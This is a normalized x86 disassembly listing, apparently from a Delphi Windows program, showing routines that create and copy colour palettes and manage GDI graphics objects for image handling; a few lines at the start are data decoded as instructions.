inc edi
dec ecx
insd
popad
test [ gs : bp + si + 0x48 ] ch
insb
and al [ edx ]
add [ eax ] al
add al 0x6a
jo r-xdata
mov eax eax
test [ edx + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
stosb [ edi ]
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
stosb [ edi ]
dec eax
add [ eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
and [ edx ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ edi + ebp * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53 ] ch
dec eax
add [ esi + ebp * 4 ] ch
dec eax
add [ ebx + ebx * 2 - 0x5253ffbe ] ah
dec eax
add ah bh
outsd
inc ecx
add [ eax ] bl
mov dl 0x48
pop ebp
retn
add [ bx + si ] al
lea eax [ eax ]
sub_48ac28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_48ac8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ac94
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_48acb8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_48acec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi rw-data
xor edx edx
mov eax edi
call sub_425afc
mov eax edi
call sub_48bcbc
movzx eax [ esi ]
mov [ edi + 0x3f ] al
movzx eax [ esi + 0x1 ]
mov [ edi + 0x3d ] al
movzx eax [ esi + 0x2 ]
mov [ edi + 0x42 ] al
movzx eax [ esi + 0x3 ]
mov [ edi + 0x3e ] al
movzx eax [ esi + 0x4 ]
mov [ edi + 0x40 ] al
movzx eax [ esi + 0x5 ]
mov [ edi + 0x41 ] al
movzx eax [ esi + 0x6 ]
mov [ edi + 0x43 ] al
movzx eax [ esi + 0x7 ]
mov [ edi + 0x3c ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_48ad68
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
call sub_403f64
mov eax [ esi + 0x28 ]
call sub_427868
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_48adac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebx + 0x28 ]
call sub_427868
mov edi esi
mov eax [ edi + 0x28 ]
mov [ ebx + 0x28 ] eax
call sub_427864
cmp [ edi + 0x2c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_416dc8
mov eax ebx
call sub_48bcbc
mov eax ebx
call sub_48bca0
mov edx esi
mov eax [ ebx + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_48bca0
mov edx [ edi + 0x2c ]
mov eax [ ebx + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_48ae2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
pop esi
pop ebx
retn
mov eax ebx
call sub_48b750
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_48ae64
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov ebx eax
call GetTickCount
mov edx eax
mov ecx edx
mov eax [ ebx + 0x20 ]
sub ecx eax
cmp ecx 0x1f4
jl r-xdata
mov [ ebx + 0x20 ] edx
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_415370
mov edi esi
mov eax [ edi + 0x8c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ edi + 0x70 ]
mov edx [ ebx + 0x24 ]
xor eax eax
call sub_415370
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x24 ]
jge r-xdata
mov [ ebx + 0x1c ] eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
fild [ ebx + 0x4 ]
fild [ ebx + 0x8 ]
fdivp st1
fild [ ebx + 0xc ]
faddp st1
fmul [ r-xdata ]
fild [ ebx + 0x10 ]
fdivp st1
call sub_40326c
cmp eax [ ebx + 0x1c ]
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esp + 0xc ] eax
jmp r-xdata
push eax
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
cmp eax 0x4
setge al
push eax
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov cl 0x1
mov esi [ ebx + 0x14 ]
mov edx esi
mov eax esi
mov si 0xfffd
call sub_404160
mov edx [ esi + 0x8c ]
mov [ ebx + 0x24 ] edx
sub_48af7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x288
call sub_403728
mov eax [ ebp - 0x4 ]
mov edi eax
mov esi rw-data
mov ecx 0x21
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0xb8
mov ecx 0x1d0
mov edx 0x3e
call sub_48c01c
xor eax eax
push ebp
push sub_48b16c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x84 ] sub_48ae64
mov eax [ ebp - 0x4 ]
mov [ eax + 0x98 ] ebx
mov eax [ ebp - 0x4 ]
add eax 0x84
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc0 ] eax
push 0x0
push 0x0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4192e0
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0xb8
call sub_48d788
mov eax [ ebp - 0x4 ]
add eax 0xb8
or edx 0xffffffff
call sub_48c2e4
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe8 ] 0x1
movzx ecx [ ebx + 0x43 ]
mov eax 0x1
shl eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0xec ] eax
cmp [ ebx + 0x3c ] 0x1
cmc
sbb eax eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x108 ] eax
cmp [ ebx + 0x3d ] 0x0
je r-xdata
cmp [ ebx + 0x3e ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe4 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10c ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x118 ] 0xec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x100 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x114 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x110 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb4 ] eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x100 ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x114 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x110 ] 0x1
cmp [ ebx + 0x42 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xb8
call sub_48c430
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x114 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x124 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x100 ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x114 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x110 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf8 ] 0xffffffff
sub_48b18c
push ebp
mov ebp esp
add esp 0xfffffd78
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x288 ]
mov eax ebx
call sub_48af7c
xor eax eax
push ebp
push sub_48b20b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1c8 ] eax
lea eax [ ebp - 0x1d0 ]
call sub_48dc30
mov eax [ ebp - 0x160 ]
mov [ ebx + 0x30 ] eax
mov eax [ ebp - 0x15c ]
mov [ ebx + 0x34 ] eax
lea eax [ ebp - 0x1d0 ]
call sub_48c430
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0x41 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x288 ]
call sub_48af58
retn
sub_48b220
push ebp
mov ebp esp
add esp 0xfffffd58
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x298 ]
xor ecx ecx
mov edx 0x288
call sub_403728
mov esi rw-data
lea edi [ ebp - 0x298 ]
mov ecx 0x21
[ edi ] [ esi ]
lea eax [ ebp - 0x298 ]
mov [ ebp - 0x1e0 ] eax
lea eax [ ebp - 0x1e0 ]
mov ecx 0x174
mov edx 0x3e
call sub_498568
xor eax eax
push ebp
push sub_48b58c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_404570
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x214 ] sub_48ae64
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x200 ] eax
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x1d8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x8 ] ebx
push 0x0
push 0x0
mov eax ebx
call sub_4192e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
lea eax [ ebp - 0x1e0 ]
call sub_49793c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x2c ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48bcbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_404884
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ ebp - 0x1c4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ ebp - 0x1c0 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov [ edx + 0xc ] eax
mov [ ebp - 0x1bc ] 0x3
mov [ ebp - 0x1b8 ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48b544
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x6
mov eax [ ebp - 0x10 ]
call sub_429860
lea eax [ ebp - 0x1e0 ]
call sub_497b94
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x3f ]
lea eax [ ebp - 0x1e0 ]
or ecx 0xffffffff
call sub_497a98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x14 ] 0x1
lea eax [ ebp - 0x1e0 ]
mov edx 0x1
call sub_497d08
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_428a50
mov [ ebp - 0xc ] eax
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_428a50
mov ebx eax
sub ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x1e0 ]
call sub_498170
mov [ ebp - 0x8 ] 0x1
test bl 0x3
jne r-xdata
mov eax [ ebp - 0x104 ]
cmp eax [ ebp - 0x1c0 ]
jb r-xdata
mov eax [ ebp - 0x1c0 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1e0 ]
mov ecx [ ebp - 0x8 ]
call sub_4983fc
mov esi eax
mov eax ebx
imul esi
add [ ebp - 0xc ] eax
lea eax [ ebp - 0x1e0 ]
call sub_498688
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b52e
call sub_402dac
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x2a8 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x2a8 ]
push eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffd
call sub_404160
xor eax eax
push ebp
push sub_48b527
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1e0 ]
or edx 0xffffffff
call sub_498388
jmp r-xdata
xor ebx ebx
mov ebx 0x64
jmp r-xdata
push ebx
push 0x0
push 0x0
lea eax [ ebp - 0x2a8 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x2a8 ]
push eax
push 0x0
mov cl 0x2
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffd
call sub_404160
retn
sub_48b54b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x298 ]
call sub_48af58
retn
sub_48b55a
add [ eax ] eax
add [ eax ] al
sub al 0x83
inc eax
add [ esi - 0x4b ] ah
dec eax
add [ ebx + 0x4ee8fc45 ] cl
pop es
add [ eax ] al
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x298 ]
call sub_48af58
retn
sub_48b59c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_48b750
mov ecx eax
mov edx edi
mov eax esi
call sub_424334
pop edi
pop esi
pop ebx
retn
sub_48b5bc
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x28 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp eax [ esi + 0x28 ]
sete bl
mov edx [ esi + 0x28 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_425bf0
mov ebx eax
jmp r-xdata
sub_48b618
push esi
push edi
add esp 0xfffffbfc
mov edi eax
mov [ esp ] 0x300
movzx edx [ edi + 0x84 ]
mov [ esp + 0x2 ] dx
cmp [ edi + 0x2c ] 0x1
jne r-xdata
movzx esi dx
dec esi
test esi esi
jl r-xdata
movzx esi dx
dec esi
test esi esi
jl r-xdata
mov eax esp
push eax
call CreatePalette
add esp 0x404
pop edi
pop esi
retn
inc esi
xor ecx ecx
lea edx [ esp + 0x4 ]
inc esi
xor ecx ecx
lea edx [ esp + 0x4 ]
mov eax [ edi + 0x88 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax + ecx ]
mov [ edx ] al
mov eax [ edi + 0x88 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + ecx ]
mov [ edx + 0x1 ] al
mov eax [ edi + 0x88 ]
mov eax [ eax ]
movzx eax [ eax + ecx ]
mov [ edx + 0x2 ] al
mov [ edx + 0x3 ] 0x0
inc ecx
add edx 0x4
dec esi
jne r-xdata
mov eax [ edi + 0x88 ]
mov eax [ eax ]
movzx eax [ eax + ecx ]
mov [ edx ] al
mov [ edx + 0x1 ] al
mov [ edx + 0x2 ] al
mov [ edx + 0x3 ] 0x0
inc ecx
add edx 0x4
dec esi
jne r-xdata
jmp r-xdata
sub_48b6c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffbfc
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push edx
call GetPaletteEntries
mov esi eax
test esi esi
je r-xdata
add esp 0x404
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x3
mov edi [ ebx + 0x4 ]
mov eax ebx
mov ecx esi
mov edx 0x1
call [ edi + 0x8 ]
mov [ ebx + 0x88 ] eax
mov [ ebx + 0x84 ] esi
mov edi esi
dec edi
test edi edi
jl r-xdata
inc edi
xor edx edx
lea eax [ esp + 0x4 ]
mov esi [ ebx + 0x88 ]
mov ecx [ esi + 0x8 ]
lea ebp [ ecx + edx ]
movzx ecx [ eax ]
mov [ ebp ] cl
mov ecx [ esi + 0x4 ]
lea ebp [ ecx + edx ]
movzx ecx [ eax + 0x1 ]
mov [ ebp ] cl
mov ecx [ esi ]
lea esi [ ecx + edx ]
movzx ecx [ eax + 0x2 ]
mov [ esi ] cl
inc edx
add eax 0x4
dec edi
jne r-xdata
sub_48b750
push ebp
mov ebp esp
add esp 0xfffffd58
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xd ] 0x1
lea edx [ ebp - 0x298 ]
mov eax [ ebp - 0x4 ]
call sub_48af7c
xor edx edx
push ebp
push sub_48bb4d
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_48bb1e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
xor edx edx
call sub_4294f4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3e ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov dl 0x3
call sub_429860
jmp r-xdata
cmp [ ebp - 0x1b4 ] 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x2a8 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x2a8 ]
push eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffd
call sub_404160
xor edx edx
push ebp
push sub_48bb0d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov dl 0x6
call sub_429860
lea eax [ ebp - 0x1e0 ]
call sub_48d7f4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x2c ]
xor edx edx
mov eax ebx
call sub_4294f4
mov edx [ ebp - 0x170 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x16c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor edx edx
mov eax ebx
call sub_428a50
mov [ ebp - 0xc ] eax
mov edx 0x1
mov eax ebx
call sub_428a50
mov esi eax
sub esi [ ebp - 0xc ]
test esi esi
jle r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x3e ] 0x1
jne r-xdata
mov ebx 0x1
test esi 0x3
jne r-xdata
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov edx eax
lea eax [ ebp - 0x1e0 ]
call sub_48b6c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_42809c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov [ ebp - 0xd ] 0x0
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x160 ]
jmp r-xdata
cmp [ ebp - 0x158 ] 0x0
je r-xdata
cmp [ ebp - 0x1e8 ] 0x0
je r-xdata
lea eax [ ebp - 0x1e0 ]
call sub_48c350
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x154 ]
cmp eax [ ebp - 0x16c ]
jb r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x1e0 ]
mov edx [ ebp - 0x150 ]
call sub_48dab8
mov eax [ ebp - 0x1d8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x198 ] eax
mov eax [ ebp - 0x1e4 ]
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x1e8 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1e0 ]
mov ecx ebx
call sub_48d97c
mov edi eax
mov eax esi
imul edi
add [ ebp - 0xc ] eax
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
lea eax [ ebp - 0x1e0 ]
call sub_48b618
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
xor edx edx
call sub_428a50
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
xor edx edx
call sub_428a50
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x158 ] 0x0
je r-xdata
lea eax [ ebp - 0x1e0 ]
mov edx [ ebp - 0x150 ]
call sub_48dab8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
xor edx edx
call sub_428a50
mov [ ebp - 0xc ] eax
mov [ ebp - 0x184 ] 0xffffffff
xor eax eax
mov [ ebp - 0x158 ] eax
lea eax [ ebp - 0x1e0 ]
call sub_48c464
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bb14
call sub_402dac
test eax eax
jne r-xdata
lea eax [ ebp - 0x1e0 ]
call sub_48db18
mov eax [ ebp - 0x154 ]
cmp eax [ ebp - 0x16c ]
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_4289cc
cmp al 0x3
jne r-xdata
xor esi esi
mov esi 0x64
jmp r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x1e0 ]
mov ecx ebx
call sub_48d97c
mov edi eax
mov eax esi
imul edi
add [ ebp - 0xc ] eax
lea eax [ ebp - 0x1e0 ]
call sub_48db18
cmp [ ebp - 0xd ] 0x0
je r-xdata
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22 ]
push eax
push 0x0
lea eax [ ebp - 0x2a8 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x2a8 ]
push eax
push 0x0
mov cl 0x2
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov si 0xfffd
call sub_404160
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22 ] 0x0
je r-xdata
lea eax [ ebp - 0x1e0 ]
call sub_48b618
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22 ] 0x1
sub_48bb14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x298 ]
call sub_48af58
retn
sub_48bb60
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov esi [ ebx + 0x2c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
sub_48bb8c
push ebx
push esi
push edi
push ebp
mov ebx eax
xor esi esi
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
jmp r-xdata
cmp [ ebx + 0x3e ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call GetDC
mov edi eax
push 0xc
push edi
call GetDeviceCaps
mov ebp eax
push 0xe
push edi
call GetDeviceCaps
imul ebp eax
cmp ebp 0x8
jg r-xdata
push edi
push 0x0
call ReleaseDC
push edi
call CreateHalftonePalette
mov esi eax
mov [ ebx + 0x38 ] esi
sub_48bbf4
push ebx
mov ebx eax
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
cmp [ ebx + 0x43 ] 0x0
jne r-xdata
mov edx [ eax ]
call [ edx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_48b18c
mov eax [ ebx + 0x34 ]
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
jmp r-xdata
pop ebx
retn
sub_48bc20
push ebx
mov ebx eax
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
cmp [ ebx + 0x43 ] 0x0
jne r-xdata
mov edx [ eax ]
call [ edx + 0x2c ]
pop ebx
retn
mov eax ebx
call sub_48b18c
mov eax [ ebx + 0x30 ]
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
jmp r-xdata
pop ebx
retn
sub_48bc5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_48bc7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4192c0
pop edx
sub edx eax
mov ecx ebx
mov eax esi
